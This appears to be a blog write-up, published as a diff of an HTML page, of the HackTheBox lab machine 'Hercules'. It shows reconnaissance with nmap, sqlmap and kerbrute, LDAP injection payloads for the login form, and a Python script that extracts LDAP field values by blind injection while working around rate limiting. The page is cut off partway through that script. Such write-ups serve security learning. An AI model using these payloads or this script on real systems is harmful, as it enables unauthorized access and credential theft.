@@ -1,0 +1,1419 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.842711649901">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 4.6.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Hercules (Insane)</title>
+    <meta name="title" content="Hercules (Insane)">
+    <meta name="description" content="Yes we run nmap as a start, but I will ditch the output since you get the idea.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/hercules/">
+    <link rel="sitemap" type="application/xml" title="Sitemap" href="https://bytebl33d.github.io/sitemap.xml">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/hercules/">
+    <meta property="og:title" content="Hercules (Insane)">
+    <meta property="og:description" content="Yes we run nmap as a start, but I will ditch the output since you get the idea.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/writeups/hercules/hercules-website.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Hercules (Insane)">
+    <meta property="og:site_name" content="bytebl33d">
+    <meta property="og:locale" content="en_US">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/hercules/">
+    <meta name="twitter:title" content="Hercules (Insane)">
+    <meta name="twitter:description" content="Yes we run nmap as a start, but I will ditch the output since you get the idea.">
+    <meta name="twitter:image" content="https://bytebl33d.github.io/assets/images/writeups/hercules/hercules-website.png">
+    <meta name="twitter:image:alt" content="Hercules (Insane)">
+
+    <!-- RSS -->
+    <link rel="alternate" type="application/rss+xml" href="https://bytebl33d.github.io/blog/feed.xml">
+
+    <!-- Alternate Markdown -->
+    <link rel="alternate" type="text/markdown" href="https://bytebl33d.github.io/writeups/hackthebox/machines/hercules.md">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../resources/css/retype.css?v=4.6.0.842711649901" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.842711649901" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=4.6.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.842711649901" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.842711649901" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+    <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+
+    <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+        <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+            <!-- Mobile menu button skeleton -->
+            <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-hidden rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+            <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+    
+            <!-- Logo -->
+            <div class="flex items-center justify-between h-full py-2 md:w-75">
+                <div class="flex items-center px-2 md:px-6">
+                    <a id="retype-branding-logo" href="https://bytebl33d.github.io/" class="flex items-center leading-snug text-2xl">
+                        <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                    </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
+                </div>
+    
+                <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+            </div>
+    
+            <div class="flex justify-between md:grow">
+                <!-- Top Nav -->
+                <nav id="retype-header-nav" class="hidden md:flex">
+                    <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                        <li class="mr-6">
+                            <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                        </li>
+                        <li class="mr-6">
+                            <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                        </li>
+    
+                    </ul>
+                </nav>
+    
+                <div v-cloak class="flex justify-end grow">
+                    <div id="retype-mobile-search-button"></div>
+                    <doc-search-desktop></doc-search-desktop>
+    
+                    <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                    <doc-history></doc-history>
+                </div>
+            </div>
+        </div>
+    </header>
+
+
+    <div id="retype-container" class="container relative flex bg-white">
+        <!-- Sidebar Skeleton -->
+        <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+        
+            <div class="flex items-center h-16 px-6">
+                <input id="retype-filter-input-mock" class="w-full h-10 pl-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded-lg shadow-none md:text-sm hover:border-filter-border-hover focus:outline-hidden focus:border-filter-border-focus placeholder-filter-placeholder" type="text">
+            </div>
+        
+            <div class="pl-6 mt-1 mb-4">
+                <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+            </div>
+        
+            <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                    <span class="text-xs whitespace-nowrap">Powered by</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                </a>
+            </div>
+        </div>
+        
+        <!-- Sidebar component -->
+        <doc-sidebar v-cloak>
+            <template #sidebar-footer>
+                <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+        
+                    <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                        <nav>
+                            <ul class="flex flex-wrap justify-center items-center">
+                                <li class="mr-6">
+                                    <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                                </li>
+                                <li class="mr-6">
+                                    <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                                </li>
+        
+                            </ul>
+                        </nav>
+                    </div>
+        
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </template>
+        </doc-sidebar>
+
+        <div class="grow min-w-0 bg-body-bg">
+            <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+<div class="flex">
+    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+        <main class="relative pb-12 lg:pt-2">
+            <div class="relative retype-markdown" id="retype-content">
+                <!-- Rendered if sidebar right is enabled -->
+                <div id="retype-sidebar-right-toggle"></div>
+                <doc-page-actions></doc-page-actions>
+
+                <!-- Page content  -->
+<h1 id="hercules-insane">Hercules (Insane)</h1>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/windows/">Windows</a>,&nbsp;</div>
+    <div><a href="../../../../categories/active-directory/">Active-Directory</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2026-08-10</span></div>
+</div>
+
+<h2 id="synopsis">Synopsis</h2>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Yes we run nmap as a start, but I will ditch the output since you get the idea.</p>
+<div id="reconnaissance-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">nmap -sCV -v 10.129.210.87 -oN hercules.nmap -Pn</code></pre>
+</doc-codeblock></div>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-info" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>NTLM authentication is disabled in the domain, so all authentications must be performed using Kerberos only.</p>
+        </div>
+    </div>
+</div>
+<p>The output contains the DNS name for the domain controller, <code translate="no" v-pre>dc.hercules.htb</code> and a Certificate Authority <code translate="no" v-pre>CA-HERCULES</code>. We also see a website on port <code translate="no" v-pre>443</code>. We add the domain to our <code translate="no" v-pre>/etc/hosts</code> file and continue to explore the site.</p>
+<div id="reconnaissance-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">echo &quot;10.10.11.91 dc.hercules.htb hercules.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+</doc-codeblock></div>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-website.png" alt="Hercules Website" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1911" height="1190" />
+    <figcaption class="caption">Hercules Website</figcaption>
+</figure>
+<p>After a quick <code translate="no" v-pre>dirsearch</code> scan we can discover a login page.</p>
+<div id="reconnaissance-code-3" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ dirsearch -u https://hercules.htb --exclude-sizes=0B
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Target: https://hercules.htb/
+
+[18:57:34] Starting:
+[18:57:58] 200 -    3KB - /login</code></pre>
+</doc-codeblock></div>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-login.png" alt="Hercules Login Page" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1635" height="907" />
+    <figcaption class="caption">Hercules Login Page</figcaption>
+</figure>
+<p>The Hercules SSO login page apparently has rate-limiting in place. When trying a default login of <code translate="no" v-pre>admin:admin</code> we get the message <code translate="no" v-pre>Invalid login attempt</code>. After running an sqlmap scan on the login form, we see that it does identify a potential injection point.</p>
+<div id="reconnaissance-code-4" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ sqlmap -r login.req --csrf-token=&quot;__RequestVerificationToken&quot;
+
+&lt;SNIP&gt;
+[19:13:47] [INFO] POST parameter 'Username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable</code></pre>
+</doc-codeblock></div>
+<p>But since we are sending too many request, the website returns status code <code translate="no" v-pre>429</code>.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-rate-limit.png" alt="Hercules Rate Limit" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1918" height="910" />
+    <figcaption class="caption">Hercules Rate Limit</figcaption>
+</figure>
+<h2 id="user">User</h2>
+<h3 id="username-enumeration">Username Enumeration</h3>
+<p>After spending some time trying to bypass the rate-limiting feature, I figured the result from <code translate="no" v-pre>sqlmap</code> is probably a false positive, but there might still be an injection in the Username field. In the meantime I was also running kerbrute to discover some potential usernames.</p>
+<div id="username-enumeration-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 $SECLISTS/Usernames/xato-net-10-million-usernames.txt
+2025/10/20 21:04:58 &gt;  [+] VALID USERNAME:       admin@hercules.htb
+2025/10/20 21:05:01 &gt;  [+] VALID USERNAME:       administrator@hercules.htb
+2025/10/20 21:05:53 &gt;  [+] VALID USERNAME:       auditor@hercules.htb
+2025/10/20 21:25:16 &gt;  [+] VALID USERNAME:       will.s@hercules.htb</code></pre>
+</doc-codeblock></div>
+<p>We got a couple of users and also found the structure of the usernames. We can now generate a more comprehensive list as follows.</p>
+<div id="username-enumeration-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ while read -r name; do for l in {a..z}; do echo &quot;$name.$l&quot;; done; done &lt; $SECLISTS/Usernames/Names/names.txt &gt; possible_users.list
+
+$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 possible_users.list
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 10/21/25 - Ronnie Flathers @ropnop
+
+2025/10/21 13:21:13 &gt;  Using KDC(s):
+2025/10/21 13:21:13 &gt;   10.129.82.25:88
+
+2025/10/21 13:21:17 &gt;  [+] VALID USERNAME:       adriana.i@hercules.htb
+2025/10/21 13:21:34 &gt;  [+] VALID USERNAME:       angelo.o@hercules.htb
+2025/10/21 13:21:45 &gt;  [+] VALID USERNAME:       ashley.b@hercules.htb
+2025/10/21 13:22:06 &gt;  [+] VALID USERNAME:       bob.w@hercules.htb
+2025/10/21 13:22:18 &gt;  [+] VALID USERNAME:       camilla.b@hercules.htb
+2025/10/21 13:22:38 &gt;  [+] VALID USERNAME:       clarissa.c@hercules.htb
+2025/10/21 13:23:22 &gt;  [+] VALID USERNAME:       elijah.m@hercules.htb
+2025/10/21 13:23:42 &gt;  [+] VALID USERNAME:       fiona.c@hercules.htb
+2025/10/21 13:24:07 &gt;  [+] VALID USERNAME:       harris.d@hercules.htb
+2025/10/21 13:24:08 &gt;  [+] VALID USERNAME:       heather.s@hercules.htb
+2025/10/21 13:24:26 &gt;  [+] VALID USERNAME:       jacob.b@hercules.htb
+2025/10/21 13:24:37 &gt;  [+] VALID USERNAME:       jennifer.a@hercules.htb
+2025/10/21 13:24:39 &gt;  [+] VALID USERNAME:       jessica.e@hercules.htb
+2025/10/21 13:24:42 &gt;  [+] VALID USERNAME:       joel.c@hercules.htb
+2025/10/21 13:24:43 &gt;  [+] VALID USERNAME:       johanna.f@hercules.htb
+2025/10/21 13:24:43 &gt;  [+] VALID USERNAME:       johnathan.j@hercules.htb
+2025/10/21 13:25:04 &gt;  [+] VALID USERNAME:       ken.w@hercules.htb
+2025/10/21 13:25:55 &gt;  [+] VALID USERNAME:       mark.s@hercules.htb
+2025/10/21 13:26:09 &gt;  [+] VALID USERNAME:       mikayla.a@hercules.htb
+2025/10/21 13:26:22 &gt;  [+] VALID USERNAME:       natalie.a@hercules.htb
+2025/10/21 13:26:22 &gt;  [+] VALID USERNAME:       nate.h@hercules.htb
+2025/10/21 13:26:42 &gt;  [+] VALID USERNAME:       patrick.s@hercules.htb
+2025/10/21 13:26:58 &gt;  [+] VALID USERNAME:       ramona.l@hercules.htb
+2025/10/21 13:27:00 &gt;  [+] VALID USERNAME:       ray.n@hercules.htb
+2025/10/21 13:27:03 &gt;  [+] VALID USERNAME:       rene.s@hercules.htb
+2025/10/21 13:27:26 &gt;  [+] VALID USERNAME:       shae.j@hercules.htb
+2025/10/21 13:27:42 &gt;  [+] VALID USERNAME:       stephanie.w@hercules.htb
+2025/10/21 13:27:42 &gt;  [+] VALID USERNAME:       stephen.m@hercules.htb
+2025/10/21 13:27:50 &gt;  [+] VALID USERNAME:       tanya.r@hercules.htb
+2025/10/21 13:28:00 &gt;  [+] VALID USERNAME:       tish.c@hercules.htb
+2025/10/21 13:28:15 &gt;  [+] VALID USERNAME:       vincent.g@hercules.htb
+2025/10/21 13:28:21 &gt;  [+] VALID USERNAME:       will.s@hercules.htb
+2025/10/21 13:28:32 &gt;  [+] VALID USERNAME:       zeke.s@hercules.htb
+2025/10/21 13:28:34 &gt;  Done! Tested 264602 usernames (33 valid) in 441.360 seconds</code></pre>
+</doc-codeblock></div>
+<p>We now have a better list of users on the domain, and when trying to login as one of these users we notice a different response for a valid username:</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-login-valid-user.png" alt="Login with valid user" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1805" height="939" />
+    <figcaption class="caption">Login with valid user</figcaption>
+</figure>
+<h3 id="ldap-injection">LDAP Injection</h3>
+<p>When testing the login form further, I found it is vulnerable to LDAP injection. LDAP filters are constructed based on one or more LDAP attributes specified as key/value pairs. The login form seems to check via LDAP if the user exists. Below I list some examples of how the backend might process the login requests.</p>
+<ul>
+<li><code translate="no" v-pre>adriana*)(cn=*</code> matches anything with a common name</li>
+<li><code translate="no" v-pre>adriana*)(description=*</code> returns a valid response if the description field contains data</li>
+</ul>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-info" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>The payload needs to be properly encoded (double-URL) so that the backend (IIS/ASP.NET) processes the request. !!!</h5>
+<p>Similar to SQL Injection, an LDAP injection vulnerability results when an application injects unfiltered user input directly into an LDAP statement. Because of the rate-limiting, we need to write a custom script that allows us to brute force valid usernames and LDAP fields much easier.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+
+import argparse
+import itertools
+import json
+import math
+import re
+import string
+import time
+from pathlib import Path
+
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+try:
+    from colorama import Fore, Style, init as colorama_init
+    colorama_init(autoreset=True)
+except Exception:
+    # fallback to ANSI if colorama isn't installed
+    class _C:
+        GREEN = '\033[92m'
+        RED = '\033[91m'
+        YELLOW = '\033[93m'
+        RESET = '\033[0m'
+    Fore = _C()
+    Style = type(&quot;S&quot;, (), {&quot;RESET_ALL&quot;: _C.RESET})
+
+# === CONFIG ===
+BASE_URL = &quot;https://hercules.htb&quot;
+LOGIN_PATH = &quot;/login&quot;
+TARGET = BASE_URL + LOGIN_PATH
+VERIFY_TLS = False
+
+# valid user string
+SUCCESS_STATUS = &quot;Login attempt failed&quot;
+
+CSRF_RE = re.compile(
+    r'name=[&quot;\']__RequestVerificationToken[&quot;\']\s+type=[&quot;\']hidden[&quot;\']\s+value=[&quot;\']([^&quot;\']+)[&quot;\']',
+    re.IGNORECASE,
+)
+
+# default character set for brute forcing (lowercase + digits + some symbols)
+DEFAULT_CHARSET = string.ascii_lowercase + string.digits + &quot;!@#$_*-.()&quot;
+
+# === HELPERS ===
+
+def extract_csrf_token_from_html(html, token_name=&quot;__RequestVerificationToken&quot;):
+    m = CSRF_RE.search(html)
+    if m:
+        return m.group(1)
+    return None
+
+
+def get_csrf(session):
+    &quot;&quot;&quot;GET the login page and return the CSRF token (or None).&quot;&quot;&quot;
+    r = session.get(TARGET, verify=VERIFY_TLS, timeout=10)
+    return extract_csrf_token_from_html(r.text)
+
+
+def url_encode_payload(payload: str) -&gt; str:
+    &quot;&quot;&quot;Percent-encode payload bytes uppercase hex (safe for form values).&quot;&quot;&quot;
+    return &quot;&quot;.join(f&quot;%{b:02X}&quot; for b in payload.encode(&quot;utf-8&quot;))
+
+# === LOGIN / INJECTION FUNCTIONS ===
+
+def validate_user(username, password=&quot;test&quot;, csrf_field=&quot;__RequestVerificationToken&quot;):
+    &quot;&quot;&quot;
+    Submit username/password to the login endpoint and return True if the
+    response contains SUCCESS_STATUS.
+    &quot;&quot;&quot;
+    session = requests.Session()
+    session.headers.update({&quot;User-Agent&quot;: &quot;ldap-helper/1.0&quot;})
+
+    token = get_csrf(session)
+    if not token:
+        raise RuntimeError(&quot;CSRF token not found&quot;)
+
+    data = {
+        &quot;Username&quot;: username,
+        &quot;Password&quot;: password,
+        &quot;RememberMe&quot;: &quot;false&quot;,
+        csrf_field: token,
+    }
+    resp = session.post(TARGET, data=data, verify=VERIFY_TLS, timeout=10)
+    return SUCCESS_STATUS in resp.text
+
+
+def ldap_inject(
+    username,
+    field=&quot;description&quot;,
+    prefix=&quot;&quot;,
+    csrf_field=&quot;__RequestVerificationToken&quot;,
+    escape_star=True,
+):
+    &quot;&quot;&quot;
+    Build an LDAP-style payload and POST it as the Username field (percent-encoded).
+    Returns True if SUCCESS_STATUS is present in the response (same check used above).
+    &quot;&quot;&quot;
+    session = requests.Session()
+    session.headers.update({&quot;User-Agent&quot;: &quot;ldap-helper/1.0&quot;})
+
+    token = get_csrf(session)
+    if not token:
+        raise RuntimeError(&quot;CSRF token not found&quot;)
+
+    # escape characters commonly problematic in LDAP filter context
+    escaped_prefix = prefix or &quot;&quot;
+    if escape_star and &quot;*&quot; in escaped_prefix:
+        escaped_prefix = escaped_prefix.replace(&quot;*&quot;, &quot;\\2a&quot;)
+    if &quot;(&quot; in escaped_prefix:
+        escaped_prefix = escaped_prefix.replace(&quot;(&quot;, &quot;\\28&quot;)
+    if &quot;)&quot; in escaped_prefix:
+        escaped_prefix = escaped_prefix.replace(&quot;)&quot;, &quot;\\29&quot;)
+
+    if escaped_prefix:
+        payload = f&quot;{username}*)({field}={escaped_prefix}*&quot;
+    else:
+        payload = f&quot;{username}*)({field}=*&quot;
+
+    encoded_payload = url_encode_payload(payload)
+
+    data = {
+        &quot;Username&quot;: encoded_payload,
+        &quot;Password&quot;: &quot;test&quot;,
+        &quot;RememberMe&quot;: &quot;false&quot;,
+        csrf_field: token,
+    }
+
+    resp = session.post(TARGET, data=data, verify=VERIFY_TLS, timeout=5)
+    if resp.status_code == 429:
+        print(&quot;{Fore.RED}[!] Hit rate limit, waiting 30 seconds...{Style.RESET_ALL}&quot;)
+        time.sleep(30)
+    return SUCCESS_STATUS in resp.text
+
+def brute_field_for_user(
+    username,
+    field,
+    charset=DEFAULT_CHARSET,
+    max_length=25,
+    delay=0.1,
+    consecutive_fail_cutoff=2,
+):
+    &quot;&quot;&quot;
+    Extract a string value for `field` for `username` using blind injection.
+    Returns discovered string (or empty string if none).
+    &quot;&quot;&quot;
+    if not ldap_inject(username):
+        # initial check: if LDAP injection with empty prefix returns false,
+        # then the user likely has no such field / no description
+        return &quot;&quot;
+    
+    print(f&quot;[*] Found possible value on {field} for object {username}&quot;)
+
+    value = &quot;&quot;
+    no_char_count = 0
+    
+    for pos in range(max_length):
+        found_this_pos = False
+        for ch in charset:
+            test_prefix = value + ch
+            try:
+                ok = ldap_inject(username, field=field, prefix=test_prefix)
+            except Exception as e:
+                # if CSRF failed or network issue, surface it
+                raise
+            if ok:
+                value += ch
+                print(ch, end=&quot;&quot;, flush=True)
+                found_this_pos = True
+                no_char_count = 0
+                break
+            time.sleep(delay)
+        if not found_this_pos:
+            no_char_count += 1
+            if no_char_count &gt;= consecutive_fail_cutoff:
+                break
+
+    print()
+    return value
+
+# === UTILITIES ===
+
+def load_usernames(path):
+    p = Path(path)
+    if not p.exists():
+        raise FileNotFoundError(f&quot;Wordlist not found: {path}&quot;)
+    with p.open(&quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as fh:
+        return [ln.strip() for ln in fh if ln.strip() and not ln.strip().startswith(&quot;#&quot;)]
+
+
+def main():
+    parser = argparse.ArgumentParser(description=&quot;HTB username checker / field brute forcer&quot;)
+    group = parser.add_mutually_exclusive_group(required=True)
